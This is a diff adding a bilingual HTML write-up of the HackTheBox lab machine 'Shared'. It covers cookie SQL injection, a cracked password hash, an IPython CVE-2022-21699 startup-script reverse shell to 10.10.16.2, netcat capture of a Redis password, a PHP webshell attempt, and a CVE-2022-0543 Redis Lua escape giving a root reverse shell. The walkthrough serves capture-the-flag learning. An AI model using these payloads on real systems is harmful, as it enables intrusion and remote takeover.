@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shared | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">shared</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering a PrestaShop e-commerce application with a custom checkout system. Through enumeration, I identified a cookie-based parameter handling mechanism that was vulnerable to SQL injection.</p>
+                    
+                    <p>By manipulating the <code>custom_cart</code> cookie in JSON format, I exploited the SQL injection to extract database credentials for the user <code>james_mason</code>. These credentials provided SSH access to the machine.</p>
+                    
+                    <p>From there, lateral movement to user <code>dan_smith</code> was achieved by exploiting CVE-2022-21699 in IPython 8.0.0. The vulnerability allowed arbitrary code execution through malicious startup scripts placed in the IPython profile directory, which <code>dan_smith</code> regularly executed via a cron job.</p>
+                    
+                    <p>Finally, privilege escalation to root was accomplished through a vulnerable Redis instance. I extracted the Redis authentication password by intercepting traffic from a custom <code>redis_connector_dev</code> binary, then leveraged CVE-2022-0543 to execute arbitrary Lua code through Redis, obtaining a root reverse shell.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Cookie-based SQL injection, PrestaShop custom checkout implementation, IPython arbitrary code execution (CVE-2022-21699), Redis Lua sandbox escape (CVE-2022-0543), binary password extraction via network interception.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and HTTPS on 443" /></p>
+
+                <p>The scan reveals standard web services on ports 80 and 443, along with SSH on port 22. I add <code>shared.htb</code> to my <code>/etc/hosts</code> file and begin web enumeration.</p>
+
+                <h2>Web Enumeration - PrestaShop E-commerce</h2>
+                <p>Accessing the web application, I find a PrestaShop-based e-commerce site selling clothing. Running <code>whatweb</code> provides additional information:</p>
+                <pre><code class="language-plaintext">https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PHP, PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]</code></pre>
+
+                <p>Wappalyzer also detects MySQL running in the backend. Using <code>gobuster</code> for virtual host enumeration, I discover:</p>
+                <pre><code class="language-plaintext">checkout.shared.htb Status: 200 [Size: 3229]
+www.checkout.shared.htb Status: 200 [Size: 3229]</code></pre>
+
+                <p>I add these virtual hosts to my <code>/etc/hosts</code> file. Interestingly, <code>checkout.shared.htb</code> can also be discovered by simply navigating through the main site and adding items to the shopping cart.</p>
+
+                <h3>Checkout Virtual Host Analysis</h3>
+                <p>The checkout subdomain presents a simple interface:</p>
+                <p><img src="./media/image9.png" alt="Checkout page showing cart items with a pay button" /></p>
+
+                <p>The interface is minimal - just a product listing and a pay button that triggers a JavaScript alert without actual functionality. However, examining the cookies reveals something interesting.</p>
+
+                <h2>Cookie-Based SQL Injection Discovery</h2>
+                <p>While inspecting the application, I notice a custom cookie implementation:</p>
+                <p><img src="./media/image12.png" alt="Browser developer tools showing the custom_cart cookie" /></p>
+
+                <p>The <code>custom_cart</code> cookie initially contains:</p>
+                <p><img src="./media/image6.png" alt="Empty custom_cart cookie with URL-encoded brackets" /></p>
+
+                <p>This is URL encoding for empty brackets <code>[]</code>. When I add an item to the cart, the cookie changes to:</p>
+                <p><img src="./media/image10.png" alt="Custom_cart cookie after adding an item to the cart" /></p>
+
+                <p>URL-decoding this reveals JSON structure:</p>
+                <p><img src="./media/image5.png" alt="Decoded JSON structure showing product ID and quantity" /></p>
+
+                <p>The cookie contains a JSON object mapping product IDs to quantities. This implementation is unusual - the checkout subdomain appears to retrieve product information based solely on this client-side cookie data, suggesting a potential injection point.</p>
+
+                <h3>Testing for SQL Injection</h3>
+                <p>I begin testing the cookie for SQL injection vulnerabilities. First, I try setting the product ID to a non-numeric value:</p>
+                <pre><code class="language-plaintext">%7B%22a%22%3A%221%22%7D</code></pre>
+
+                <p>Which decodes to <code>{"a":"1"}</code>. This produces an error message:</p>
+                <p><img src="./media/image4.png" alt="Error message indicating the product was not found in the database" /></p>
+
+                <p>The error suggests the application is querying a database to retrieve product information. I move to Burp Suite for easier manipulation and begin testing SQL injection payloads.</p>
+
+                <h3>Confirming SQL Injection</h3>
+                <p>After several tests, I successfully inject SQL comments:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite showing successful SQL injection with comment syntax" /></p>
+
+                <p>The application accepts the SQL comment syntax, confirming the vulnerability. I can now proceed to extract data from the database.</p>
+
+                <h3>Database Enumeration via SQLi</h3>
+                <p>Using UNION-based SQL injection, I determine the number of columns and identify where output is displayed:</p>
+                <p><img src="./media/image8.png" alt="SQL injection payload showing MySQL version and column positions" /></p>
+
+                <p>I discover that the database is already selected and is named <code>checkout</code>. Through systematic enumeration, I find a <code>user</code> table containing credentials:</p>
+                <p><img src="./media/image7.png" alt="Extracted username james_mason from the database" /></p>
+
+                <p><img src="./media/image1.png" alt="Extracted password hash for james_mason" /></p>
+
+                <p>The credentials extracted are:</p>
+                <ul>
+                    <li>Username: <code>james_mason</code></li>
+                    <li>Password hash: <code>fc895d4eddc2fc12f995e18c865cf273</code></li>
+                </ul>
+
+                <p>Using CrackStation, I successfully crack the hash: <code>Soleil101</code></p>
+
+                <h2>Initial Access - SSH as james_mason</h2>
+                <p>Testing the recovered credentials against SSH:</p>
+                <pre><code class="language-bash">ssh james_mason@10.10.11.172</code></pre>
+
+                <p>The credentials work, granting me initial access to the system as <code>james_mason</code>.</p>
+
+                <h2>Privilege Escalation - Lateral Movement to dan_smith</h2>
+                <p>Once on the system, I check user and group information:</p>
+                <pre><code class="language-bash">id</code></pre>
+                <pre><code class="language-plaintext">uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)</code></pre>
+
+                <p>I notice another user, <code>dan_smith</code>, exists in <code>/home</code>:</p>
+                <pre><code class="language-bash">id dan_smith</code></pre>
+                <pre><code class="language-plaintext">uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)</code></pre>
+
+                <p>The <code>developer</code> group is shared between both users. I search for files belonging to this group:</p>
+                <pre><code class="language-bash">find / -group developer 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/opt/scripts_review</code></pre>
+
+                <p>The <code>sysadmin</code> group also reveals an interesting binary:</p>
+                <pre><code class="language-bash">find / -group sysadmin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/redis_connector_dev</code></pre>
+
+                <p>Examining this binary:</p>
+                <pre><code class="language-bash">ls -la /usr/local/bin/redis_connector_dev</code></pre>
+                <pre><code class="language-plaintext">-rwxr-x--- 1 root sysadmin 5974154 Mar 20 2022 /usr/local/bin/redis_connector_dev</code></pre>
+
+                <p>I also notice Redis is running locally:</p>
+                <pre><code class="language-bash">ss -tlnp | grep 6379</code></pre>
+                <pre><code class="language-plaintext">tcp LISTEN 0 511 127.0.0.1:6379 0.0.0.0:*</code></pre>
+
+                <p>Attempting to access Redis without authentication fails:</p>
+                <pre><code class="language-bash">redis-cli
+INFO</code></pre>
+                <pre><code class="language-plaintext">NOAUTH Authentication required.</code></pre>
+
+                <h3>Process Monitoring with pspy</h3>
+                <p>I upload <code>pspy64</code> to monitor running processes and discover a scheduled task:</p>
+                <pre><code class="language-plaintext">2025/12/30 10:10:01 CMD: UID=1001 PID=3377 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
+2025/12/30 10:10:01 CMD: UID=1001 PID=3378 | /usr/bin/pkill ipython
+2025/12/30 10:10:01 CMD: UID=1001 PID=3379 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython</code></pre>
+
+                <p>This reveals that user <code>dan_smith</code> (UID 1001) is regularly executing IPython from the <code>/opt/scripts_review/</code> directory, which belongs to the <code>developer</code> group - meaning I have write access.</p>
+
+                <h3>Exploiting IPython CVE-2022-21699</h3>
+                <p>I check the IPython version:</p>
+                <pre><code class="language-bash">/usr/local/bin/ipython --version</code></pre>
+                <pre><code class="language-plaintext">8.0.0</code></pre>
+
+                <p>Researching this version, I find it's vulnerable to CVE-2022-21699, an arbitrary code execution vulnerability. The exploit is documented in the IPython repository: <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">GHSA-pq7m-3gw7-gq5x</a></p>
+
+                <p>The vulnerability allows arbitrary Python code execution through startup scripts placed in the IPython profile directory. When IPython starts, it automatically executes any Python files in <code>profile_default/startup/</code>.</p>
+
+                <h3>Crafting the Exploit</h3>
+                <p>I create a malicious Python script to send a reverse shell:</p>
+                <pre><code class="language-python">import os
+os.system('bash -i >& /dev/tcp/10.10.16.2/443 0>&1')</code></pre>
+
+                <p>Then I create the necessary directory structure in <code>/opt/scripts_review</code>:</p>
+                <pre><code class="language-bash">mkdir -m 777 /opt/scripts_review/profile_default
+mkdir -m 777 /opt/scripts_review/profile_default/startup
+cp xd.py /opt/scripts_review/profile_default/startup/xd.py
+chmod 777 /opt/scripts_review/profile_default/startup/xd.py</code></pre>
+
+                <p>I set up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Shortly after, when the cron job executes IPython, I receive a reverse shell:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.172] 34084
+bash: cannot set terminal process group (4048): Inappropriate ioctl for device
+bash: no job control in this shell
+dan_smith@shared:/opt/scripts_review$</code></pre>
+
+                <p>I now have access as <code>dan_smith</code> and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root - Redis Exploitation</h2>
+                <p>Now as <code>dan_smith</code>, I can execute the previously discovered <code>redis_connector_dev</code> binary:</p>
+                <pre><code class="language-bash">/usr/local/bin/redis_connector_dev</code></pre>
+                <pre><code class="language-plaintext">[+] Logging to redis instance using password...
+
+INFO command result:
+# Server
+redis_version:6.0.15
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:4610f4c3acf7fb25
+redis_mode:standalone
+os:Linux 5.10.0-16-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:4275
+run_id:7442092fa928b264a6c15deca2c98d4f93458cab
+tcp_port:6379
+uptime_in_seconds:42
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:5501749
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+<nil></code></pre>
+
+                <p>The output indicates the binary authenticates to Redis using a password. If I can extract this password, I can access Redis with full privileges.</p>
+
+                <h3>Password Extraction via Network Interception</h3>
+                <p>Instead of reverse engineering the binary, I use a simpler approach: intercepting the network traffic. I set up a netcat listener on port 6379 (Redis default port) on my local machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 6379</code></pre>
+
+                <p>Then I run the binary, which attempts to connect to localhost:6379. Since I'm listening, I capture the authentication attempt:</p>
+                <pre><code class="language-plaintext">listening on [any] 6379 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37756
+*2
+$4
+auth
+$16
+F2WHqJUz2WEz=Gqq</code></pre>
+
+                <p>Perfect! The password is: <code>F2WHqJUz2WEz=Gqq</code></p>
+
+                <p>I verify it works:</p>
+                <pre><code class="language-bash">redis-cli
+AUTH F2WHqJUz2WEz=Gqq</code></pre>
+                <pre><code class="language-plaintext">OK</code></pre>
+
+                <h3>Exploiting Redis with CVE-2022-0543</h3>
+                <p>Initially, I attempt to write a webshell using Redis:</p>
+                <pre><code class="language-redis">config set dir /var/www/checkout.shared.htb/
+config set dbfilename shell.php
+set shell "<?php system($_GET['cmd']); ?>"
+save</code></pre>
+
+                <p>However, the web server user doesn't have permissions to read the file:</p>
+                <p><img src="./media/image11.png" alt="403 Forbidden error when trying to access the webshell" /></p>
+
+                <p>I also try creating cron jobs and SSH keys, but these approaches don't work due to directory permissions and Redis's file format quirks.</p>
+
+                <p>Instead, I leverage CVE-2022-0543, a Lua sandbox escape vulnerability in Redis 6.0.15. The vulnerability is documented at: <a href="https://nvd.nist.gov/vuln/detail/cve-2022-0543">CVE-2022-0543</a></p>
+
+                <p>A proof-of-concept is available at: <a href="https://github.com/0x7eTeam/CVE-2022-0543/blob/main/CVE-2022-0543.py">CVE-2022-0543.py</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability allows loading arbitrary shared objects (`.so` files) through Lua's <code>package.loadlib</code> function, which is normally sandboxed but can be bypassed. By loading <code>liblua5.1.so.0</code>, I can access the <code>io.popen</code> function to execute system commands.</p>
+
+                <p>First, I test command execution:</p>
+                <pre><code class="language-redis">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0</code></pre>
+                <pre><code class="language-plaintext">"uid=0(root) gid=0(root) groups=0(root)\n"</code></pre>
+
+                <p>Excellent! Commands execute as root. Now I send a reverse shell:</p>
+                <pre><code class="language-redis">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i >& /dev/tcp/10.10.16.2/443 0>&1\"", "r"); local res = f:read("*a"); f:close(); return res' 0</code></pre>
+
+                <p>On my netcat listener, I receive a root shell, allowing me to retrieve the root flag and complete the machine.</p>
+
+                <h3>Understanding Redis File Format Issues</h3>
+                <p>As a side note, Redis saves files in a binary format with metadata, which explains why my earlier cron job attempts failed:</p>
+                <pre><code class="language-plaintext">REDIS0009� redis-ver6.0.15�
+�edis-bits�@�ctime��Siused-mem�@O
+aof-preamble���x6
+* * * * * /bin/bash -c 'echo test > /tmp/crontest'</code></pre>
+
+                <p>The binary header corrupts the cron syntax, preventing execution. This is why the Lua-based exploitation method was necessary for achieving root access.</p>
+            </div>
+
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó descubriendo una aplicación de comercio electrónico PrestaShop con un sistema de checkout personalizado. Mediante enumeración, identifiqué un mecanismo de manejo de parámetros basado en cookies que era vulnerable a inyección SQL.</p>
+                    
+                    <p>Manipulando la cookie <code>custom_cart</code> en formato JSON, exploté la inyección SQL para extraer credenciales de la base de datos del usuario <code>james_mason</code>. Estas credenciales proporcionaron acceso SSH a la máquina.</p>
+                    
+                    <p>Desde allí, el movimiento lateral al usuario <code>dan_smith</code> se logró explotando CVE-2022-21699 en IPython 8.0.0. La vulnerabilidad permitía ejecución arbitraria de código mediante scripts de inicio maliciosos colocados en el directorio de perfil de IPython, que <code>dan_smith</code> ejecutaba regularmente mediante un cron job.</p>
+                    
+                    <p>Finalmente, la escalada de privilegios a root se consiguió a través de una instancia vulnerable de Redis. Extraje la contraseña de autenticación de Redis interceptando tráfico de un binario personalizado <code>redis_connector_dev</code>, luego aproveché CVE-2022-0543 para ejecutar código Lua arbitrario a través de Redis, obteniendo una reverse shell como root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección SQL basada en cookies, implementación personalizada de checkout de PrestaShop, ejecución arbitraria de código en IPython (CVE-2022-21699), escape del sandbox Lua de Redis (CVE-2022-0543), extracción de contraseñas de binarios mediante interceptación de red.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y HTTPS en el 443" /></p>
+
+                <p>El escaneo revela servicios web estándar en los puertos 80 y 443, junto con SSH en el puerto 22. Añado <code>shared.htb</code> a mi archivo <code>/etc/hosts</code> y empiezo la enumeración web.</p>
+
+                <h2>Enumeración Web - PrestaShop E-commerce</h2>
+                <p>Al acceder a la aplicación web, encuentro un sitio PrestaShop de comercio electrónico que vende ropa. Ejecutando <code>whatweb</code> obtengo información adicional:</p>
+                <pre><code class="language-plaintext">https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PHP, PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]</code></pre>
+
+                <p>Wappalyzer también detecta MySQL ejecutándose en el backend. Usando <code>gobuster</code> para enumeración de virtual hosts, descubro:</p>
+                <pre><code class="language-plaintext">checkout.shared.htb Status: 200 [Size: 3229]
+www.checkout.shared.htb Status: 200 [Size: 3229]</code></pre>
+
+                <p>Añado estos virtual hosts a mi archivo <code>/etc/hosts</code>. Curiosamente, <code>checkout.shared.htb</code> también puede descubrirse simplemente navegando por el sitio principal y añadiendo artículos al carrito de compra.</p>
+
+                <h3>Análisis del Virtual Host de Checkout</h3>
+                <p>El subdominio de checkout presenta una interfaz simple:</p>
+                <p><img src="./media/image9.png" alt="Página de checkout mostrando artículos del carrito con un botón de pago" /></p>
+
+                <p>La interfaz es minimalista - solo un listado de productos y un botón de pago que desencadena una alerta de JavaScript sin funcionalidad real. Sin embargo, al examinar las cookies revelo algo interesante.</p>
+
+                <h2>Descubrimiento de Inyección SQL Basada en Cookies</h2>
+                <p>Al inspeccionar la aplicación, noto una implementación de cookies personalizada:</p>
+                <p><img src="./media/image12.png" alt="Herramientas de desarrollador del navegador mostrando la cookie custom_cart" /></p>
+
+                <p>La cookie <code>custom_cart</code> inicialmente contiene:</p>
+                <p><img src="./media/image6.png" alt="Cookie custom_cart vacía con corchetes codificados en URL" /></p>
+
+                <p>Esto es codificación URL para corchetes vacíos <code>[]</code>. Cuando añado un artículo al carrito, la cookie cambia a:</p>
+                <p><img src="./media/image10.png" alt="Cookie custom_cart después de añadir un artículo al carrito" /></p>
+
+                <p>Decodificar esto en URL revela una estructura JSON:</p>
+                <p><img src="./media/image5.png" alt="Estructura JSON decodificada mostrando ID de producto y cantidad" /></p>
+
+                <p>La cookie contiene un objeto JSON que mapea IDs de productos a cantidades. Esta implementación es inusual - el subdominio de checkout parece recuperar información de productos basándose únicamente en estos datos de cookie del lado del cliente, sugiriendo un potencial punto de inyección.</p>
+
+                <h3>Probando Inyección SQL</h3>
+                <p>Comienzo probando vulnerabilidades de inyección SQL en la cookie. Primero, intento establecer el ID de producto a un valor no numérico:</p>
+                <pre><code class="language-plaintext">%7B%22a%22%3A%221%22%7D</code></pre>
+
+                <p>Que decodifica a <code>{"a":"1"}</code>. Esto produce un mensaje de error:</p>
+                <p><img src="./media/image4.png" alt="Mensaje de error indicando que el producto no se encontró en la base de datos" /></p>
+
+                <p>El error sugiere que la aplicación está consultando una base de datos para recuperar información del producto. Me muevo a Burp Suite para una manipulación más fácil y comienzo probando payloads de inyección SQL.</p>
+
+                <h3>Confirmando Inyección SQL</h3>
+                <p>Después de varias pruebas, inyecto exitosamente comentarios SQL:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite mostrando inyección SQL exitosa con sintaxis de comentarios" /></p>
+
+                <p>La aplicación acepta la sintaxis de comentarios SQL, confirmando la vulnerabilidad. Ahora puedo proceder a extraer datos de la base de datos.</p>
+
+                <h3>Enumeración de Base de Datos mediante SQLi</h3>
+                <p>Usando inyección SQL basada en UNION, determino el número de columnas e identifico dónde se muestra la salida:</p>
+                <p><img src="./media/image8.png" alt="Payload de inyección SQL mostrando versión de MySQL y posiciones de columnas" /></p>
+
+                <p>Descubro que la base de datos ya está seleccionada y se llama <code>checkout</code>. Mediante enumeración sistemática, encuentro una tabla <code>user</code> que contiene credenciales:</p>
+                <p><img src="./media/image7.png" alt="Nombre de usuario james_mason extraído de la base de datos" /></p>
+
+                <p><img src="./media/image1.png" alt="Hash de contraseña extraído para james_mason" /></p>
+
+                <p>Las credenciales extraídas son:</p>
+                <ul>
+                    <li>Nombre de usuario: <code>james_mason</code></li>
+                    <li>Hash de contraseña: <code>fc895d4eddc2fc12f995e18c865cf273</code></li>
+                </ul>
+
+                <p>Usando CrackStation, crackeo exitosamente el hash: <code>Soleil101</code></p>
+
+                <h2>Acceso Inicial - SSH como james_mason</h2>
+                <p>Probando las credenciales recuperadas contra SSH:</p>
+                <pre><code class="language-bash">ssh james_mason@10.10.11.172</code></pre>
+
+                <p>Las credenciales funcionan, otorgándome acceso inicial al sistema como <code>james_mason</code>.</p>
+
+                <h2>Escalada de Privilegios - Movimiento Lateral a dan_smith</h2>
+                <p>Una vez en el sistema, compruebo la información de usuario y grupo:</p>
+                <pre><code class="language-bash">id</code></pre>
+                <pre><code class="language-plaintext">uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)</code></pre>
+
+                <p>Noto que existe otro usuario, <code>dan_smith</code>, en <code>/home</code>:</p>
+                <pre><code class="language-bash">id dan_smith</code></pre>
+                <pre><code class="language-plaintext">uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)</code></pre>
+
+                <p>El grupo <code>developer</code> es compartido entre ambos usuarios. Busco archivos pertenecientes a este grupo:</p>
+                <pre><code class="language-bash">find / -group developer 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/opt/scripts_review</code></pre>
+
+                <p>El grupo <code>sysadmin</code> también revela un binario interesante:</p>
+                <pre><code class="language-bash">find / -group sysadmin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/redis_connector_dev</code></pre>
+
+                <p>Examinando este binario:</p>
+                <pre><code class="language-bash">ls -la /usr/local/bin/redis_connector_dev</code></pre>
+                <pre><code class="language-plaintext">-rwxr-x--- 1 root sysadmin 5974154 Mar 20 2022 /usr/local/bin/redis_connector_dev</code></pre>
+
+                <p>También noto que Redis está ejecutándose localmente:</p>
+                <pre><code class="language-bash">ss -tlnp | grep 6379</code></pre>
+                <pre><code class="language-plaintext">tcp LISTEN 0 511 127.0.0.1:6379 0.0.0.0:*</code></pre>
+
+                <p>Intentando acceder a Redis sin autenticación falla:</p>
+                <pre><code class="language-bash">redis-cli
+INFO</code></pre>
+                <pre><code class="language-plaintext">NOAUTH Authentication required.</code></pre>
+
+                <h3>Monitoreo de Procesos con pspy</h3>
+                <p>Subo <code>pspy64</code> para monitorear procesos en ejecución y descubro una tarea programada:</p>
+                <pre><code class="language-plaintext">2025/12/30 10:10:01 CMD: UID=1001 PID=3377 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
+2025/12/30 10:10:01 CMD: UID=1001 PID=3378 | /usr/bin/pkill ipython
+2025/12/30 10:10:01 CMD: UID=1001 PID=3379 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython</code></pre>
+
+                <p>Esto revela que el usuario <code>dan_smith</code> (UID 1001) está ejecutando regularmente IPython desde el directorio <code>/opt/scripts_review/</code>, que pertenece al grupo <code>developer</code> - lo que significa que tengo acceso de escritura.</p>
+
+                <h3>Explotando IPython CVE-2022-21699</h3>
+                <p>Compruebo la versión de IPython:</p>
+                <pre><code class="language-bash">/usr/local/bin/ipython --version</code></pre>
+                <pre><code class="language-plaintext">8.0.0</code></pre>
+
+                <p>Investigando esta versión, encuentro que es vulnerable a CVE-2022-21699, una vulnerabilidad de ejecución arbitraria de código. El exploit está documentado en el repositorio de IPython: <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">GHSA-pq7m-3gw7-gq5x</a></p>
+
+                <p>La vulnerabilidad permite ejecución arbitraria de código Python mediante scripts de inicio colocados en el directorio de perfil de IPython. Cuando IPython arranca, automáticamente ejecuta cualquier archivo Python en <code>profile_default/startup/</code>.</p>
+
+                <h3>Elaborando el Exploit</h3>
+                <p>Creo un script Python malicioso para enviar una reverse shell:</p>
+                <pre><code class="language-python">import os
+os.system('bash -i >& /dev/tcp/10.10.16.2/443 0>&1')</code></pre>
+
+                <p>Luego creo la estructura de directorios necesaria en <code>/opt/scripts_review</code>:</p>
+                <pre><code class="language-bash">mkdir -m 777 /opt/scripts_review/profile_default
+mkdir -m 777 /opt/scripts_review/profile_default/startup
+cp xd.py /opt/scripts_review/profile_default/startup/xd.py
+chmod 777 /opt/scripts_review/profile_default/startup/xd.py</code></pre>
+
+                <p>Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Poco después, cuando el cron job ejecuta IPython, recibo una reverse shell:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.172] 34084
+bash: cannot set terminal process group (4048): Inappropriate ioctl for device
+bash: no job control in this shell
+dan_smith@shared:/opt/scripts_review$</code></pre>
+
+                <p>Ahora tengo acceso como <code>dan_smith</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios a Root - Explotación de Redis</h2>
+                <p>Ahora como <code>dan_smith</code>, puedo ejecutar el binario <code>redis_connector_dev</code> descubierto previamente:</p>
+                <pre><code class="language-bash">/usr/local/bin/redis_connector_dev</code></pre>
+                <pre><code class="language-plaintext">[+] Logging to redis instance using password...
+
+INFO command result:
+# Server
+redis_version:6.0.15
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:4610f4c3acf7fb25
+redis_mode:standalone
+os:Linux 5.10.0-16-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:4275
+run_id:7442092fa928b264a6c15deca2c98d4f93458cab
+tcp_port:6379
+uptime_in_seconds:42
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:5501749
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+<nil></code></pre>
+
+                <p>La salida indica que el binario se autentica en Redis usando una contraseña. Si puedo extraer esta contraseña, podré acceder a Redis con privilegios completos.</p>
+
+                <h3>Extracción de Contraseña mediante Interceptación de Red</h3>
+                <p>En lugar de hacer ingeniería inversa del binario, uso un enfoque más simple: interceptar el tráfico de red. Configuro un listener de netcat en el puerto 6379 (puerto predeterminado de Redis) en mi máquina local:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 6379</code></pre>
+
+                <p>Luego ejecuto el binario, que intenta conectarse a localhost:6379. Como estoy escuchando, capturo el intento de autenticación:</p>
+                <pre><code class="language-plaintext">listening on [any] 6379 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37756
+*2
+$4
+auth
+$16
+F2WHqJUz2WEz=Gqq</code></pre>
+
+                <p>¡Perfecto! La contraseña es: <code>F2WHqJUz2WEz=Gqq</code></p>
+
+                <p>Verifico que funciona:</p>
+                <pre><code class="language-bash">redis-cli
+AUTH F2WHqJUz2WEz=Gqq</code></pre>
+                <pre><code class="language-plaintext">OK</code></pre>
+
+                <h3>Explotando Redis con CVE-2022-0543</h3>
+                <p>Inicialmente, intento escribir una webshell usando Redis:</p>
+                <pre><code class="language-redis">config set dir /var/www/checkout.shared.htb/
+config set dbfilename shell.php
+set shell "<?php system($_GET['cmd']); ?>"
+save</code></pre>
+
+                <p>Sin embargo, el usuario del servidor web no tiene permisos para leer el archivo:</p>
+                <p><img src="./media/image11.png" alt="Error 403 Forbidden al intentar acceder a la webshell" /></p>
+
+                <p>También intento crear cron jobs y claves SSH, pero estos enfoques no funcionan debido a permisos de directorio y peculiaridades del formato de archivos de Redis.</p>
+
+                <p>En su lugar, aprovecho CVE-2022-0543, una vulnerabilidad de escape del sandbox Lua en Redis 6.0.15. La vulnerabilidad está documentada en: <a href="https://nvd.nist.gov/vuln/detail/cve-2022-0543">CVE-2022-0543</a></p>
+
